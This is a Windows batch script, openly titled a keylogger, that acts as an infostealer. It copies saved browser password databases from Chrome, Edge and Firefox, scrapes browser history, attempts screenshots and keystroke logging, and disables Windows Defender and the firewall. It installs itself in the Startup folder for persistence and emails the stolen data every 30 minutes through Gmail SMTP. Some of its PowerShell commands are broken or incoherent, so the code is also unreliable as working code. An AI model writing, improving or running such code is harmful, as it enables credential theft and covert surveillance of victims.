@echo off
setlocal enabledelayedexpansion

:: Set SMTP configuration for email sending
set "smtp_server=smtp.gmail.com"
set "smtp_port=587"
set "smtp_user=your_email@gmail.com"
set "smtp_password=your_password"
set "recipient_email=recipient_email@gmail.com"

:: Function to send email with attachment using SMTP
:send_email
powershell.exe -Command "Send-MailMessage -SmtpServer %smtp_server% -Port %smtp_port% -UseSsl -From %smtp_user% -To %recipient_email% -Subject 'Keylogger Report' -Body 'Attached are the screenshots, browser passwords, browser history, and keyboard logs.' -Attachments %1, %2, %3, %4, %5 -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '%smtp_user%', (ConvertTo-SecureString '%smtp_password%' -AsPlainText -Force))"

:: Function to copy all passwords from browsers
:copy_browser_passwords
set "passwords_dir=%TEMP%\Passwords"
if not exist "%passwords_dir%" mkdir "%passwords_dir%"
copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%passwords_dir%\Chrome_Login_Data"
copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%passwords_dir%\Edge_Login_Data"
copy "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" "%passwords_dir%\Firefox_Logins.json"

:: Function to copy browser history
:copy_browser_history
set "history_file=%TEMP%\Browser_History.txt"
if exist "%history_file%" del "%history_file%"
powershell.exe -Command "(Get-Content $Env:APPDATA\..\Local\Google\Chrome\User Data\Default\History -Encoding Unicode | Select-String -Pattern 'http' -AllMatches).Matches | ForEach-Object { $_.Value } | Out-File '%history_file%' -Encoding Unicode -Append"
powershell.exe -Command "(Get-Content $Env:APPDATA\..\Local\Microsoft\Edge\User Data\Default\History -Encoding Unicode | Select-String -Pattern 'http' -AllMatches).Matches | ForEach-Object { $_.Value } | Out-File '%history_file%' -Encoding Unicode -Append"
powershell.exe -Command "(Get-Content $Env:APPDATA\..\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite -Encoding Unicode | Select-String -Pattern 'http' -AllMatches).Matches | ForEach-Object { $_.Value } | Out-File '%history_file%' -Encoding Unicode -Append"

:: Function to capture screenshots
:capture_screenshots
set "screenshot_dir=%TEMP%\Screenshots"
if not exist "%screenshot_dir%" mkdir "%screenshot_dir%"
powershell.exe -Command "(New-Object -ComObject WScript.Shell).SendKeys('%{PRTSC}'); Start-Sleep -Milliseconds 500; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{V}'); Start-Sleep -Seconds 5; (New-Object -ComObject WScript.Shell).SendKeys('%{PRTSC}'); Start-Sleep -Milliseconds 500; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{V}'); Start-Sleep -Seconds 5; (New-Object -ComObject WScript.Shell).SendKeys('%{PRTSC}'); Start-Sleep -Milliseconds 500; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{V}'); Start-Sleep -Seconds 5; Rename-Item -Path $Env:USERPROFILE\clipboard.png -Destination '%screenshot_dir%\screenshot1.png'; Rename-Item -Path $Env:USERPROFILE\clipboard.png -Destination '%screenshot_dir%\screenshot2.png'; Rename-Item -Path $Env:USERPROFILE\clipboard.png -Destination '%screenshot_dir%\screenshot3.png'"

:: Function to capture keyboard data (keylogger)
:capture_keylogger
set "keylog_file=%TEMP%\keylogger.txt"
if exist "%keylog_file%" del "%keylog_file%"
powershell.exe -Command "$LogFile = '%keylog_file%'; If (-Not (Test-Path $LogFile)) { New-Item -Path $LogFile -ItemType File }; Add-Type -AssemblyName System.Windows.Forms; While ($True) { $Key = [System.Windows.Forms.SendKeys]::WaitForChanged(System.Windows.Forms.Keys, 1e3); If ($Key.Key -ne 'None') { Add-Content -Path $LogFile -Value ($Key.Key) }}"

::not necessary
:: Install the script to the target PC
::copy "%~dpf0" "C:\Users\Public\Keylogger.bat" /Y

 Set the script to autorun after system boot on the target PC
copy "%~dpf0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Keylogger.bat" /Y

:: Main script
:main
:: Disable Windows Defender
powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Disable Windows Firewall
netsh advfirewall set allprofiles state off

:: Copy all passwords from browsers
call :copy_browser_passwords

:: Copy browser history
call :copy_browser_history

:: Capture screenshots
call :capture_screenshots

:: Capture keyboard data (keylogger)
start /min cmd /c call :capture_keylogger

:: Send captured data via email
call :send_email "%passwords_dir%\Chrome_Login_Data" "%passwords_dir%\Edge_Login_Data" "%passwords_dir%\Firefox_Logins.json" "%history_file%" "%keylog_file%"


:: Wait for 30 minutes before repeating the process
timeout /t 1800 /nobreak
goto main
